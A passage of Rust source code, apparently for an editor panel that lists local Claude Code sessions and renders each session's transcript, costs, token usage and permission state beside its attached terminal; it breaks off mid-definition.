//! Renders the sessions of Claude Code running on this machine, and the conversation of
//! the selected one.
//!
//! One type draws both halves, in two views that share a store: the dock panel draws the
//! list of sessions, and an editor tab — the same type with `in_pane` set — draws the
//! conversation beside the session's terminal. A transcript is not readable at the
//! width of a dock, and the selection lives in the store rather than in either view, so
//! choosing a session in the dock is what the tab shows.
//!
//! Two properties drive the shape of this file. The conversation order comes from
//! [`crate::Transcript`], never from the file's line order, because rewinds and
//! compaction leave abandoned branches behind in the same file. And the transcript is
//! large — single files of several megabytes and thousands of records are normal — so
//! the conversation is drawn with the virtualizing [`list`] element and every expensive
//! per-record artifact (a parsed [`Markdown`], a decoded image, a persisted output read
//! back from disk) is built only once the record is actually on screen, then cached.

use std::{
    path::{Component, Path, PathBuf},
    sync::Arc,
    time::Duration,
};

use collections::{HashMap, HashSet};
use fs::Fs;
use gpui::{
    AbsoluteLength, Animation, AnimationExt as _, AnyElement, AsyncWindowContext, DragMoveEvent,
    Empty, Entity, EventEmitter, FocusHandle, Focusable, FontWeight, Hsla, Image, ImageFormat,
    Length, ListAlignment, ListSizingBehavior, ListState, MouseButton, MouseDownEvent,
    MouseUpEvent, Pixels, Point, Rems, Render, ScrollHandle, Subscription, Task,
    TextStyleRefinement, WeakEntity, canvas, img, list, pulsating_between, relative,
};
use markdown::{HeadingLevelStyles, Markdown, MarkdownElement, MarkdownFont, MarkdownStyle};
use project::Project;
use serde_json::Value;
use settings::{DockSide, Settings as _};
use task::{RevealStrategy, SpawnInTerminal, TaskId};
use terminal_view::{TerminalView, terminal_panel::TerminalPanel};
use theme::Appearance;
use tmux_sessions::tmux_attach_command;
use ui::{
    Button, ButtonStyle, Disclosure, Divider, ListItem, ListItemSpacing, ScrollAxes, Scrollbars,
    SelectableButton as _, TintColor, Tooltip, WithScrollbar as _, prelude::*,
};
use util::{ResultExt as _, truncate_and_trailoff};
use workspace::{
    Item, Workspace,
    dock::{DockPosition, Panel, PanelEvent},
};

use crate::{
    ChannelInboxEvent, ClaudeSessionStore, ClaudeSessionsSettings, EndedReason, EndedSession,
    HookInstallOutcome, LiveSession, LiveState, ModelRates, OpenInEditor, RegisteredSession,
    RunningTool, SessionRow, StatusSnapshot, SubagentSummary, ToggleFocus, TranscriptRecord,
    TranscriptTarget, Turn, Usage, rates_for_model,
    session_registry::{attachment_is_readable, tmux_session_name, workflow_run_id_in_tool_result},
    session_source::{FileContents, LocalSource, RemoteSource, SessionSource},
    terminal_anchors::{self, Anchoring, Glyphs, ScreenRow},
    transcript::{AutoModeFlags, Spend},
};

const CLAUDE_SESSIONS_PANEL_KEY: &str = "ClaudeSessionsPanel";
const NOW_ROW_ENTRY_KEY: &str = "now-row";

/// Drag payload for the live-message box's top-edge resize handle.
struct DraggedLiveMessageDivider;

/// Drag payload for the rail's width handle. The panel consumes it itself: it is not
/// a workspace dock, so nothing above this view is watching the drag.
#[derive(Clone)]
struct DraggedRail;

impl Render for DraggedRail {
    fn render(&mut self, _window: &mut Window, _cx: &mut Context<Self>) -> impl IntoElement {
        Empty
    }
}

#[derive(Clone)]
struct ZoomedImage {
    key: SharedString,
    image: Arc<Image>,
}

/// How tall, in rems, the box holding what the session is saying right now may grow
/// before what does not fit is scrolled to instead.
const LIVE_MESSAGE_MAX_HEIGHT_REMS: f32 = 10.;
const LIVE_MESSAGE_MIN_HEIGHT_REMS: f32 = 3.;
const LIVE_MESSAGE_HEIGHT_PANEL_FRACTION: f32 = 0.6;
const LIVE_MESSAGE_STALE_MS: i64 = 30_000;
const INTERRUPT_SENT_MS: i64 = 5_000;
/// mm:ss has no hour field. Remote events carry the host clock; without a cap a
/// skewed host would render millions of minutes next to the now row.
const ELAPSED_DISPLAY_CAP_SECONDS: i64 = 99 * 60 + 59;
const CONTEXT_METER_WIDTH_PIXELS: f32 = 120.;
const NARROW_PANEL_WIDTH_PIXELS: f32 = 420.;
const CONVERSATION_MIN_HEIGHT_REMS: f32 = 6.;
const MAX_REPORT_UNCLAMPED_LINES: usize = 40;
const NOTEBOOK_EDIT_TOOL_NAME: &str = "NotebookEdit";

/// How far, in pixels, from the end of that box still counts as being at its end, so that
/// a reader who has not scrolled it is followed to the newest words. A line is taller
/// than this.
const LIVE_MESSAGE_TAIL_PIXELS: f32 = 8.;

const COMPACT_BOUNDARY_SUBTYPE: &str = "compact_boundary";

/// The field every record Claude Code writes carries the time in, as RFC 3339 in UTC.
const TIMESTAMP_FIELD: &str = "timestamp";
/// Names the API call a record was written from. Claude Code writes one record per
/// content block, so the records of one answer share this and differ in their uuids.
const REQUEST_ID_FIELD: &str = "requestId";

/// Hours and minutes on a 24-hour clock, which is what an answer's line has room for.
const CLOCK_FORMAT: &str = "%H:%M";
const LOCAL_COMMAND_SUBTYPE: &str = "local_command";
const SYSTEM_RECORD_TYPE: &str = "system";
const AWAY_SUMMARY_SUBTYPE: &str = "away_summary";
const BRIDGE_STATUS_SUBTYPE: &str = "bridge_status";
/// What a `bridge_status` URL has to be before the panel offers to open it. The record is
/// untrusted JSON and the button hands the string to the machine's URL opener, so
/// anything that is not the bridge's own page is drawn as text and nothing else.
const BRIDGE_URL_PREFIX: &str = "https://claude.ai/";

/// Timing the CLI writes when a turn closes: how long it took, how many messages were
/// in it, and how many background agents are still running.
const TURN_DURATION_SUBTYPE: &str = "turn_duration";
/// Bookkeeping that the stop hook ran. It carries no text for the reader.
const STOP_HOOK_SUMMARY_SUBTYPE: &str = "stop_hook_summary";
const ATTACHMENT_RECORD_TYPE: &str = "attachment";
const TOTAL_TOKENS_REMINDER_ATTACHMENT: &str = "total_tokens_reminder";
const AUTO_MODE_ATTACHMENT: &str = "auto_mode";

/// The attachment Claude Code writes for a message typed while it was answering.
const QUEUED_COMMAND_ATTACHMENT: &str = "queued_command";

/// Said above a message the session is holding behind the turn it is running.
const QUEUED_NOTE: &str = "Queued";
const ATTACHMENTS_ENTRY_KEY: &str = "context-attachments";

/// The blocks Claude Code injects into the text of a user record: context it assembled
/// itself, not words the user typed. A real message often carries one of these appended to
/// its tail, and a record is sometimes nothing but one, so they are cut out of the text
/// rather than the record being dropped whole.
const INJECTED_WRAPPERS: [&str; 6] = [
    "system-reminder",
    "task-notification",
    "persisted-output",
    "codegraph_context",
    "local-command-stdout",
    // Claude Code's note to itself that the user ran the command rather than the model,
    // written alongside the output. Like the output, it is nothing the user typed.
    "local-command-caveat",
];

const PERSISTED_OUTPUT_MARKER: &str = "<persisted-output>";
const PERSISTED_OUTPUT_PATH_PREFIX: &str = "Full output saved to: ";
const PERSISTED_OUTPUT_SIZE_PREFIX: &str = "Output too large (";
const PERSISTED_OUTPUT_PREVIEW_PREFIX: &str = "Preview (";

/// Comfortably above the tens of kilobytes that tool outputs are persisted at in
/// practice. A larger file is still shown, truncated, together with its path, because
/// holding an unbounded amount of text in one list item would stall the whole panel.
const MAX_PERSISTED_OUTPUT_BYTES: u64 = 4 * 1024 * 1024;

/// The ceiling the far end puts on one read; asking for more of an image than this would
/// be answered with a prefix of it, which decodes into nothing. A larger image is offered
/// behind a button rather than fetched on draw; see [`MAX_SENT_IMAGE_BYTES_ABSOLUTE`].
const MAX_SENT_IMAGE_BYTES: u64 = 4 * 1024 * 1024;

/// Hard ceiling for a sent image the reader has asked to load anyway. A larger file is
/// named rather than fetched: a 64 MiB decode would stall the panel.
const MAX_SENT_IMAGE_BYTES_ABSOLUTE: u64 = 64 * 1024 * 1024;

/// How much of a CLI dispatch's prompt file is read to take its first non-empty line.
const MAX_DISPATCH_PROMPT_BYTES: u64 = 4 * 1024;

const NO_SESSIONS: &str = "No Claude Code sessions are running on this project's host.";
const SELECT_A_SESSION: &str = "Select a session to read its conversation.";
const WAITING_FOR_TRANSCRIPT: &str =
    "This session has not written a transcript file yet. It will appear as soon as it does.";
const EMPTY_TRANSCRIPT: &str = "This conversation has no messages yet.";
const CHANNEL_PERMISSION_WAITING: &str = "answered — waiting for the session";
const CHANNEL_PERMISSION_UNAVAILABLE: &str =
    "Approve in the terminal or on claude.ai (channel not loaded)";
const THINKING_NOTE: &str = "Thinking…";

const ASSISTANT_RECORD_TYPE: &str = "assistant";
const USER_RECORD_TYPE: &str = "user";
const THINKING_BLOCK_TYPE: &str = "thinking";
const TOOL_USE_BLOCK_TYPE: &str = "tool_use";
const TOOL_RESULT_BLOCK_TYPE: &str = "tool_result";
const IMAGE_BLOCK_TYPE: &str = "image";

/// The two blocks Claude Code writes into a user record for a slash command. Unlike
/// [`INJECTED_WRAPPERS`] these are not cut out: what is inside them is the command the
/// user ran and the arguments they typed after it.
const COMMAND_NAME_WRAPPER: &str = "command-name";
const COMMAND_ARGS_WRAPPER: &str = "command-args";

/// How much of a running tool's target is shown beside its name. Counted in characters:
/// a `Bash` command is often a whole pipeline, and the head of it is what says which
/// call is running.
const TOOL_TARGET_CHARACTERS: usize = 40;

/// First line of a `prompt` argument when that is the tool's target.
const TOOL_TARGET_PROMPT_CHARACTERS: usize = 80;

/// How much text an `Edit` may carry before its card stops diffing it line by line. The
/// diff is derived once per record, but a pair of megabyte strings is still work nothing
/// on screen can use.
const MAX_EDIT_DIFF_BYTES: usize = 128 * 1024;

/// One cycle of the pulse that marks something as still in progress — a message that has
/// not arrived, a session that is answering. Matches the period the agent panel pulses
/// its own icons at.
const PULSE_PERIOD: Duration = Duration::from_secs(1);

/// How long a second click on Stop is accepted before the control disarms itself.
const STOP_ARM_MS: i64 = 5_000;

/// How many lines of a tool's output are drawn before the rest is put behind a
/// disclosure. A build log or a test run is thousands of lines, and one of them drawn
/// whole leaves no room in the panel for the conversation around it.
const MAX_UNCLAMPED_OUTPUT_LINES: usize = 12;
const ANCHOR_GUTTER_WIDTH_PIXELS: f32 = 28.;
const RAIL_WIDTH_DEFAULT_PIXELS: f32 = 380.;
const RAIL_WIDTH_MIN_PIXELS: f32 = 240.;
const RAIL_WIDTH_MAX_PIXELS: f32 = 900.;
const TERMINAL_MIN_WIDTH_PIXELS: f32 = 320.;
const RAIL_RESIZE_HANDLE_PIXELS: f32 = 6.;

/// The one tool whose input is a command rather than a description of one, so the
/// command itself is what is drawn, in the shell's own syntax.
const BASH_TOOL_NAME: &str = "Bash";
const TODO_WRITE_TOOL_NAME: &str = "TodoWrite";
const ASK_USER_QUESTION_TOOL_NAME: &str = "AskUserQuestion";
const EDIT_TOOL_NAME: &str = "Edit";
const WRITE_TOOL_NAME: &str = "Write";

/// The tools that carry the text of the file they are about, and the field of their
/// input it sits in. That text is what the call is, so it is what is drawn, in the
/// language of the file it names.
///
/// `Read` is deliberately absent: its input names a path and carries none of the file, so
/// there is nothing of the file to draw and its input is JSON however the file is
/// written.
const FILE_TOOL_CONTENT_FIELDS: [(&str, &str); 3] = [
    ("Write", "content"),
    ("Edit", "new_string"),
    ("NotebookEdit", "new_source"),
];

/// The two tools that start conversations of their own: one agent, and a run of several.
const AGENT_TOOL_NAME: &str = "Agent";
const WORKFLOW_TOOL_NAME: &str = "Workflow";

/// How much of an agent's id a chip carries when the agent recorded no description of
/// what it was asked to do. Enough to tell two agents apart without the id taking the
/// whole chip.
const AGENT_ID_CHIP_CHARACTERS: usize = 6;

/// What every workflow run id starts with, dropped from a heading because every run in
/// the list carries it and none of it tells two runs apart.
const WORKFLOW_RUN_ID_PREFIX: &str = "wf_";

/// The field Claude Code writes beside a `Bash` result when the command was left running
/// in the background. Its presence is what tells a backgrounded call from an ordinary one,
/// and its value is the id every later notification names that shell by.
const BACKGROUND_TASK_ID_FIELD: &str = "backgroundTaskId";

/// What a backgrounded call's own result says before naming the file the command's output
/// is being written to.
const BACKGROUND_OUTPUT_PREFIX: &str = "Output is being written to: ";

/// The notification Claude Code queues into the conversation when a background command
/// ends, and the element of it naming which one ended. This is the only record that a
/// shell is over: the command writes to a file rather than into the conversation.
const TASK_NOTIFICATION_OPEN: &str = "<task-notification>";
const TASK_NOTIFICATION_CLOSE: &str = "</task-notification>";
const TASK_NOTIFICATION_ID_OPEN: &str = "<task-id>";
const TASK_NOTIFICATION_ID_CLOSE: &str = "</task-id>";

const PEER_MESSAGE_LEAD: &str = "Another Claude session sent a message:";
const AGENT_MESSAGE_WRAPPER: &str = "agent-message";
const CHANNEL_WRAPPER: &str = "channel";
const HUMAN_ORIGIN: &str = "human";
const CHANNEL_ORIGIN: &str = "channel";
const PEER_ORIGIN: &str = "peer";
const TASK_NOTIFICATION_ORIGIN: &str = "task-notification";
const SYSTEM_PROMPT_SOURCE: &str = "system";

/// The sentence Claude Code writes immediately after the output path. The path is cut
/// here rather than at the first `. `, because a `. ` can be part of the path itself.
const BACKGROUND_OUTPUT_FOLLOWING_SENTENCE: &str = ". You will be notified";

/// How much of a command a background shell's label carries when the call recorded no
/// description of what it was for.
const SHELL_LABEL_CHARACTERS: usize = 40;

/// How much of a command a background shell's tooltip carries. A backgrounded command is
/// often a whole script written inline, and a tooltip the height of the window says less
/// than one that fits on screen.
const SHELL_TOOLTIP_COMMAND_CHARACTERS: usize = 240;

/// What a background shell's row says beside its name. Only the ones still running are
/// drawn, so this is the one thing such a row can say.
const SHELL_RUNNING_NOTE: &str = "Running";

const MAIN_CONVERSATION_CHIP: &str = "Main";

const NO_OUTPUT_NOTE: &str = "(no output)";

/// How much of the speaker's own color the rail beside a message carries. Full strength
/// beside every message competes with the text for attention.
const ROLE_RAIL_OPACITY: f32 = 0.5;

/// Multiples of the text's own size, for the lines within a paragraph.
const CONVERSATION_LINE_HEIGHT: f32 = 1.5;

/// What the toolbar says about the session, left to right: the model answering it, the
/// effort it is answering at, how much context its newest answer was given, and what it
/// has cost.
///
/// Each is left out when the transcript does not say it, rather than shown as a blank or
/// a zero — a session that has not answered yet knows none of them.
#[cfg(test)]
fn session_facts(spend: &Spend) -> Vec<SharedString> {
    let mut facts = Vec::new();
    if let Some(model) = spend.model.clone() {
        facts.push(model);
    }
    if let Some(effort) = spend.effort.clone() {
        facts.push(effort);
    }
    // What the session has spent, as against what it is carrying: the context figure
    // above is the size of one request, and says nothing about how much work has gone
    // through the session to reach it.
    let read = spend
        .usage
        .input_tokens
        .saturating_add(spend.usage.cache_read_tokens)
        .saturating_add(spend.usage.cache_write_1h_tokens)
        .saturating_add(spend.usage.cache_write_5m_tokens);
    if read > 0 || spend.usage.output_tokens > 0 {
        facts.push(SharedString::from(format!(
            "{} in · {} out",
            compact_token_count(read),
            compact_token_count(spend.usage.output_tokens)
        )));
    }
    if let Some(cost) = session_cost(spend) {
        facts.push(cost);
    }
    if let Some(reported) = spend.reported.as_ref()
        && let Some(lines) = line_change_fact(reported.lines_added, reported.lines_removed)
    {
        facts.push(lines);
    }
    facts
}

fn line_change_fact(added: u64, removed: u64) -> Option<SharedString> {
    if added == 0 && removed == 0 {
        return None;
    }
    Some(SharedString::from(format!("+{added} −{removed} lines")))
}

/// The whole tooltip the permission chip carries: the mode, the auto-mode flags, and the
/// bash-first steer the flags have no room for.
fn permission_tooltip(
    permission_mode: Option<&str>,
    auto_mode: Option<AutoModeFlags>,
    bash_first_steer: Option<&str>,
) -> String {
    let mut tooltip = auto_mode_tooltip(permission_mode, auto_mode);
    if let Some(steer) = bash_first_steer
        .map(str::trim)
        .filter(|steer| !steer.is_empty())
    {
        tooltip.push_str(&format!(
            "\nBash-first steer: {}",
            truncate_and_trailoff(steer, AUTO_MODE_STEER_CHARACTERS)
        ));
    }
    tooltip
}

/// How much of the `bashFirstSteer` string a tooltip shows. It is free text from the
/// transcript, and a tooltip is not where a paragraph of it belongs.
const AUTO_MODE_STEER_CHARACTERS: usize = 80;

fn auto_mode_tooltip(permission_mode: Option<&str>, auto_mode: Option<AutoModeFlags>) -> String {
    let mut lines = vec![format!(
        "Permission mode: {}",
        permission_mode
            .filter(|mode| !mode.is_empty())
            .unwrap_or("unknown")
    )];
    if let Some(flags) = auto_mode {
        let mut parts = Vec::new();
        if flags.bash_first {
            parts.push("bash-first");
        }
        if flags.steer_only {
            parts.push("steer-only");
        }
        if flags.bypass {
            parts.push("bypass");
        }
        if parts.is_empty() {
            lines.push("Auto mode: on".to_string());
        } else {
            lines.push(format!("Auto mode: {}", parts.join(", ")));
        }
    }
    lines.join("\n")
}

/// What one answer cost, and the tokens behind the figure.
///
/// Priced by the model the session is on: an answer's own record names the model, but the
/// usage read here has already been separated from it, and a session's model changes
/// rarely enough that the newest one is the right guess for all of them. Nothing is said
/// at all for a model with no known rates.
fn answer_cost(
    usage: Usage,
    answered_at: Option<&SharedString>,
    store: &ClaudeSessionStore,
) -> Option<SharedString> {
    let spend = store.transcript().spend();
    let rates = rates_for_model(spend.model.as_deref()?)?;
    Some(SharedString::from(answer_summary(
        usage,
        rates,
        answered_at,
    )))
}

/// The line drawn under an answer when the reader has asked what it cost.
///
/// The three kinds of input are named separately because they are priced twenty-fold
/// apart — fresh input at the full rate, a cache write at twice it or a quarter more, a
/// cache read at a tenth of it — so one combined "in" figure says nothing about where an
/// answer's money went. Each is left out when it is zero, which keeps the line short on
/// the answers that only read from the cache.
fn answer_summary(usage: Usage, rates: ModelRates, answered_at: Option<&SharedString>) -> String {
    // First, because it is what the rest of the line is dated by: the cache write below
    // says how long what this answer wrote lives, and that is only an expiry once there
    // is a time to count it from.
    let mut parts: Vec<String> = answered_at
        .map(|answered_at| answered_at.to_string())
        .into_iter()
        .collect();
    parts.push(format_usd(usage.cost(rates)));

    if usage.input_tokens > 0 {
        parts.push(format!("{} in", compact_token_count(usage.input_tokens)));
    }
    if usage.cache_read_tokens > 0 {
        parts.push(format!(
            "{} cache read",
            compact_token_count(usage.cache_read_tokens)
        ));
    }
    // Split by how long what it wrote lives, which is both what it cost — an hour at
    // twice the input rate, five minutes at a quarter more — and how long the next answer
    // has to start before it pays to write the same thing again. A record that reported
    // no split reads as five minutes here, because that is the length it is priced at;
    // see `Usage::from_record`.
    for (tokens, ttl) in [
        (usage.cache_write_1h_tokens, "1h"),
        (usage.cache_write_5m_tokens, "5m"),
    ] {
        if tokens > 0 {
            parts.push(format!(
                "{} cache write ({ttl})",
                compact_token_count(tokens)
            ));
        }
    }
    parts.push(format!("{} out", compact_token_count(usage.output_tokens)));
    if usage.thinking_tokens > 0 {
        // Bracketed because it is part of the output above rather than additional to it.
        parts.push(format!(
            "({} thinking)",
            compact_token_count(usage.thinking_tokens)
        ));
    }

    parts.join(" · ")
}

/// What the session has cost.
///
/// Claude Code's own figure when it has written one, because it prices every model it
/// ran — including ones this code has no rates for. Otherwise the total derived from the
/// token counts, marked `~` to say it was derived here and from which rates. A model
/// with no known rates yields nothing rather than a wrong number.
fn session_cost(spend: &Spend) -> Option<SharedString> {
    if let Some(reported) = &spend.reported {
        return Some(SharedString::from(format_usd(reported.total_usd)));
    }

    let rates = rates_for_model(spend.model.as_deref()?)?;
    Some(SharedString::from(format!(
        "~{}",
        format_usd(spend.usage.cost(rates))
    )))
}

/// Cents for anything under ten dollars and whole dollars above it: at a hundred dollars
/// the cents are noise, and under a dollar they are the whole figure.
fn format_usd(amount: f64) -> String {
    if amount < 10. {
        format!("${amount:.2}")
    } else {
        format!("${amount:.0}")
    }
}

/// When a record was written, on the reader's own clock.
///
/// Claude Code writes the timestamp in UTC, and a reader comparing it against the length
/// of the cache entry the same answer wrote — five minutes or an hour — is doing that
/// against the clock on their wall. `None` for a record carrying no timestamp, or one
/// this cannot read: a wrong time is worse than none, because nothing about it looks
/// wrong.
fn answered_at(raw: &Value) -> Option<SharedString> {
    let written = raw.get(TIMESTAMP_FIELD).and_then(Value::as_str)?;
    let written = chrono::DateTime::parse_from_rfc3339(written).ok()?;
    Some(SharedString::from(
        written
            .with_timezone(&chrono::Local)
            .format(CLOCK_FORMAT)
            .to_string(),
    ))
}

/// Token counts as a reader reads them: `535K`, `2.3M`.
fn compact_token_count(tokens: u64) -> String {
    match tokens {
        0..=9_999 => format!("{tokens}"),
        10_000..=999_999 => format!("{}K", tokens / 1_000),
        _ => format!("{:.1}M", tokens as f64 / 1_000_000.),
    }
}

fn uninstall_hooks_note(result: anyhow::Result<()>) -> SharedString {
    match result {
        Ok(()) => SharedString::from(
            "Hooks uninstalled. Run `claude mcp remove zed-claude` to remove the MCP server.",
        ),
        Err(error) => SharedString::from(format!("Could not uninstall: {error:#}")),
    }
}

/// Wall-clock milliseconds, as the registrations record them.
fn now_millis() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|since_epoch| since_epoch.as_millis() as i64)
        .unwrap_or(0)
}

/// How long a session has sat without changing what it is doing.
///
/// `None` for anything recent: every session is quiet between turns, and a row that says
/// so for all of them says nothing. What it answers is the opposite question — which of
/// these was last touched days ago.
fn idle_for(updated_at: Option<i64>, now_millis: i64) -> Option<SharedString> {
    const MINUTE: i64 = 60 * 1000;
    const HOUR: i64 = 60 * MINUTE;
    const DAY: i64 = 24 * HOUR;
    const TWO_DAYS: i64 = 2 * DAY;
    /// Below this a session is simply between turns.
    const WORTH_SAYING: i64 = 10 * MINUTE;

    let idle = now_millis.saturating_sub(updated_at?);
    if idle < WORTH_SAYING {
        return None;
    }

    // Hours are kept past the first day, because "33h" says something "1d" does not —
    // it would read the same as 47h. Past two days the hours stop being a unit anyone
    // converts in their head.
    Some(SharedString::from(match idle {
        ..HOUR => format!("idle {}m", idle / MINUTE),
        HOUR..TWO_DAYS => format!("idle {}h", idle / HOUR),
        _ => format!("idle {}d", idle / DAY),
    }))
}

/// The ground under the reader's own messages. A neutral grey rather than a wash of the
/// theme's foreground, which carries the theme's hue and reads as a faint tint rather
/// than as grey; and light enough to be a step away from the conversation's ground
/// without becoming a block of its own.
const USER_MESSAGE_GROUND: Hsla = Hsla {
    h: 0.,
    s: 0.,
    l: 0.5,
    a: 0.02,
};

/// The conversation's scrollbar is drawn in its own colour rather than the theme's, so
/// that how far up the history the reader is sitting is legible at a glance against the
/// transcript behind it.
const CONVERSATION_SCROLLBAR_COLOR: Hsla = Hsla {
    h: 28. / 360.,
    s: 0.9,
    l: 0.55,
    a: 1.,
};

#[derive(Clone, Debug, PartialEq, Eq)]
struct TerminalTarget {
    /// The tmux pane and the process in it, never the conversation: `/clear` gives the
    /// session a new id while the process stays in the pane it was already attached in,
    /// and re-attaching there would cost the reader their terminal and leave a second
    /// mirror behind.
    pane: String,
    process_id: u32,
}

/// What [`ClaudeSessionsPanel::sync_terminal`] does with the client it already has.
///
/// `attach_arguments` mints a mirror name every time it is read, so it is read only from
/// [`TerminalSync::Attach`]. [`TerminalSync::Keep`] and [`TerminalSync::Drop`] return
/// before that call.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum TerminalSync {
    /// The pane and the process are unchanged, including across `/clear`.
    Keep,
    /// Nothing attachable is selected. The client is dropped.
    Drop,
    /// A different pane or process. The client is dropped and attached again.
    Attach,
}

fn terminal_sync(
    current: Option<&TerminalTarget>,
    wanted: Option<&TerminalTarget>,
) -> TerminalSync {
    if current == wanted {
        TerminalSync::Keep
    } else if wanted.is_some() {
        TerminalSync::Attach
    } else {
        TerminalSync::Drop
    }
}

pub struct ClaudeSessionsPanel {
    workspace: WeakEntity<Workspace>,
    focus_handle: FocusHandle,
    /// Only used to write the dock side back to the settings file, which is where it
    /// lives so that it survives a restart.
    fs: Arc<dyn Fs>,
    store: Entity<ClaudeSessionStore>,
    /// The same source the store reads through, kept here for the one read the panel
    /// performs on its own behalf: a persisted tool output.
    source: Arc<dyn SessionSource>,
    /// Used only to shorten the working directory of sessions opened inside this project.
    project_root: Option<PathBuf>,
    /// The flattened conversation, one entry per rendered item. Rebuilt from the
    /// transcript whenever the store reports a change, and spliced into `list_state` so
    /// that the items which did not move keep their measured height.
    entries: Vec<Entry>,
    /// What the selected session is doing, as of the last change to its transcript; see
    /// [`activity`].
    activity: Activity,
    /// The calls in the conversation on screen that started conversations of their own,
    /// keyed by the entry each is drawn as; see [`agent_calls`]. Rebuilt with the entries
    /// rather than cached with them, because the state of what a call started changes
    /// while the call's own record never does.
    agent_calls: HashMap<SharedString, AgentCall>,
    /// What each record of the conversation was billed. Held beside the entries rather
    /// than on them: most billed records write no text block, and so produce no entry
    /// that could carry a bill.
    billing: HashMap<SharedString, Billed>,
    /// One turn's calls, taken before collapse drops the thinking and tool entries.
    /// The last record of a call is often one of those. Keyed by the turn's first
    /// entry, which collapse keeps.
    turn_bills: HashMap<SharedString, (Vec<Usage>, Usage)>,
    list_state: ListState,
    /// Whether the list of sessions is showing its rows. Collapsing it gives the whole
    /// panel to the conversation, which is what the user is here to read.
    session_list_expanded: bool,
    /// The sessions whose agent rows are folded away, by session id. Held as what is
    /// closed rather than as what is open, so that a session listed for the first time
    /// arrives showing what it is running rather than hiding it.
    collapsed_session_agents: HashSet<String>,
    /// True for the copy opened as an editor tab, which is already where opening one
    /// would take the reader.
    in_pane: bool,
    terminal: Option<Entity<TerminalView>>,
    terminal_for: Option<TerminalTarget>,
    _terminal_attach: Task<()>,
    /// Hides the transcript rail. The embedded terminal stays: collapsing the rail is
    /// not detaching, and an attached client is what the reader is looking at.
    rail_expanded: bool,
    /// False leaves the rail for what the terminal cannot show. True is the escape
    /// hatch that draws the conversation in the rail as well.
    rail_shows_everything: bool,
    /// Set after Allow/Deny until the hook's pending permission clears.
    permission_answered: bool,
    /// The call whose permission that answer was for. Two prompts of one turn can land in
    /// a single poll — the tool that was allowed finishes and the next permission is asked
    /// for — and the second one has been answered by nobody.
    permission_answered_for: Option<SharedString>,
    /// Where the reader has scrolled what the session is saying right now, and how long
    /// that was when it was last looked at; see
    /// [`ClaudeSessionsPanel::follow_the_live_message`].
    live_message_scroll: ScrollHandle,
    live_message_length: usize,
    live_message_markdown_key: Option<SharedString>,
    live_message_identity: Option<(Option<String>, usize)>,
    live_message_height: Pixels,
    live_message_drag: Option<(Pixels, Pixels)>,
    now_row_expanded: bool,
    interrupt_sent_at_ms: Option<i64>,
    stop_armed_until_ms: Option<(String, i64)>,
    lifecycle_note: Option<SharedString>,
    _lifecycle_command: Task<()>,
    /// What installing the hook did, kept on screen afterwards because it says where the
    /// settings it changed were copied to. Cleared when a question can be read, which is
    /// the install having taken effect.
    hook_install_note: Option<SharedString>,
    /// Held so that dropping it cancels an install that is still running.
    _installing_hook: Task<()>,
    /// See [`UnreadBelow`].
    unread_below: UnreadBelow,
    /// Whether the reader was at the tail of the conversation the last time the list
    /// could say so.
    ///
    /// `ListState::is_scrolled_to_end` answers `None` while the items a splice added
    /// have not been measured, and every arrival splices. Reading that as "at the tail"
    /// scrolls a reader who is part-way up the history down to the tail on the next
    /// arrival — so the last definite answer is kept here and used instead.
    scrolled_to_end: bool,
    /// Keys of the entries — and of the attachments nested inside the context section —
    /// the user has opened.
    expanded: HashSet<SharedString>,
    /// Whether the conversation is read with [`crate::Transcript::full_path`], which
    /// includes everything compaction dropped from the model's context.
    show_full_history: bool,
    /// Whether a turn's cost is drawn. Beside the terminal that is one card per
    /// turn; with [`Self::rail_shows_everything`] it is the line under each answer.
    show_costs: bool,
    /// Whether the session's tool calls, their results, and its thinking are drawn.
    /// Closed by default: one turn can hold dozens of them, and a conversation read for
    /// what was said is buried under them.
    show_tool_calls: bool,
    markdowns: HashMap<SharedString, Entity<Markdown>>,
    /// Keyed by record uuid, and so unaffected by the conversation growing around an
    /// entry; see [`EntryCache`].
    entry_cache: EntryCache,
    /// The store's transcript generation the cache was filled from. A change means the
    /// transcript was thrown away, and with it everything derived from it.
    cached_transcript_generation: u64,
    /// The home directory the cache's entries were derived against; see
    /// [`Self::refresh_entry_cache`].
    cached_home_directory: Option<PathBuf>,
    /// How many of the transcript's overwritten uuids the cache has already dropped.
    overwrites_dropped: usize,
    loaded_outputs: HashMap<SharedString, OutputLoad>,
    output_loads: HashMap<SharedString, Task<()>>,
    loaded_attachments: HashMap<SharedString, AttachmentLoad>,
    /// Sent images the reader asked to fetch past [`MAX_SENT_IMAGE_BYTES`].
    forced_attachment_loads: HashSet<SharedString>,
    /// The prompt files CLI-dispatch cards were given, keyed by [`dispatch_prompt_key`].
    dispatch_prompts: HashMap<SharedString, OutputLoad>,
    /// The calls whose results carry the patch that was applied, so that their cards do
    /// not draw a second diff of their own; see [`edit_card_diff`].
    patched_calls: HashSet<SharedString>,
    attachment_loads: HashMap<SharedString, Task<()>>,
    /// Bumped when `entries` is replaced, and when the pre-collapse anchors change
    /// without the collapsed list changing. Alignment reuses a generation only while
    /// those anchors are the same, so a frame does not parse tool inputs again.
    entries_generation: u64,
    /// Anchors from the entries before collapse. A finished turn drops its tool
    /// rows, and the chip has to survive that; `index` is into [`Self::entries`].
    reachable_anchors: Vec<ReachableAnchor>,
    anchor_cache: Option<AnchorCache>,
    /// Whether the cached alignment was built for a scrolled-back screen.
    /// The same visible rows at the bottom and in the scrollback use different
    /// transcript windows.
    cached_scrolled_back: bool,
    /// Width of the transcript rail. Lives only on this panel; nothing persists it.
    rail_width: Pixels,
    /// Width left for the terminal and the rail together, measured from the row.
    /// `None` until the first layout, so the terminal floor is not applied to a
    /// width of zero.
    rail_row_budget: Option<Pixels>,
    rail_drag_position: Option<Point<Pixels>>,
    zoomed_image: Option<ZoomedImage>,
    /// Entry keys whose anchors are on the terminal's visible screen this frame.
    anchored_on_screen: HashSet<SharedString>,
    hovered_anchor: Option<SharedString>,
    /// Last rail index a scroll-back followed. The same index on the next frame
    /// must not scroll again, or the reader can never move the rail themselves.
    followed_index: Option<usize>,
    _store_subscription: Subscription,
}

#[derive(Clone, PartialEq)]
struct Entry {
    /// Stable across rebuilds — a record uuid, plus the block's position within the
    /// record — so caches and expansion state survive the transcript growing.
    key: SharedString,
    kind: EntryKind,
}

#[derive(Clone, PartialEq)]
enum EntryKind {
    Message {
        role: MessageRole,
        source: SharedString,
        /// What the answer this message is part of was billed. `None` for the reader's
        /// own messages, which are not billed on their own.
